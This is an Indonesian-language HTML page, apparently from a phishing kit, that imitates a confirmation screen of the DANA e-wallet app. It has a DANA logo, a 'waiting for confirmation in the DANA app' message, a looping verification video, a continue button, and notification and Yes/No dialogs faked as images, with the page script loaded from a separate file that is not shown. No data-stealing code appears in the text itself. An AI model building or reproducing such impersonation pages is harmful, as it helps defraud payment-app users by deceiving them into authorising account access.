<!DOCTYPE html>
<html lang="id">
<head>
 
<meta charset="UTF-8">

<meta
name="viewport"
content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>Konfirmasi</title>

<link
rel="stylesheet"
href="success.css">

</head>
<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img
        src="assets/logo-danaa.png"
        class="logo">

    </div>

    <!-- TEKS MENUNGGU -->
<div class="waiting-wrapper">

    <div class="video-text">
        Menunggu konfirmasi di aplikasi dana
    </div>

    <div class="dots-loading">
        <span></span>
        <span></span>
        <span></span>
    </div>

</div>

<!-- VIDEO CARD -->
<div class="card photo-card">

    <video
    class="photo-video"
    autoplay
    muted
    loop
    playsinline>

        <source
        src="assets/verifikasi.mp4"
        type="video/mp4">

    </video>

</div>

<!-- TEKS PETUNJUK -->
<div class="verify-text">
    Jika sudah di verifikasi silahkan klik
</div>

<!-- BUTTON -->
<button
type="button"
class="btn-lanjut"
id="btnLanjut">

    LANJUTKAN

</button>

</div>

<!-- ========================= -->
<!-- NOTIF -->
<!-- ========================= -->

<div
class="notif-overlay"
id="notifOverlay">

    <div
    class="notif-box"
    id="notifBox">

        <img
        src="assets/notif.png"
        class="notif-img">

    </div>

</div>

<!-- ========================= -->
<!-- POPUP YA/TIDAK -->
<!-- ========================= -->

<div
class="popup-overlay"
id="popup2">

    <div class="popup-box">

        <img
        src="assets/popup-ya-tidak.png"
        class="popup-img">

        <div class="btn-group">

            <!-- TIDAK -->
            <button
            class="btn-no"
            id="btnTidak">

                Tidak

            </button>

            <!-- YA -->
            <button
            class="btn-yes"
            id="btnYa">

                Ya

            </button>

        </div>

    </div>

</div>

<!-- ========================= -->
<!-- LOADING -->
<!-- ========================= -->

<div
class="loading-box"
id="loadingBox">

    <div class="loading-circle">

        <div class="spinner-ring"></div>

        <img
        src="assets/loadingg-danaa.png"
        class="loading-logo">

    </div>

    <div class="loading-text">

        Memuat...

    </div>

</div>

<!-- SOUND -->
<audio
id="successSound"
autoplay>

<source
src="assets/successss.mp3"
type="audio/mpeg">

</audio>

<script src="success.js"></script>

</body>
</html>
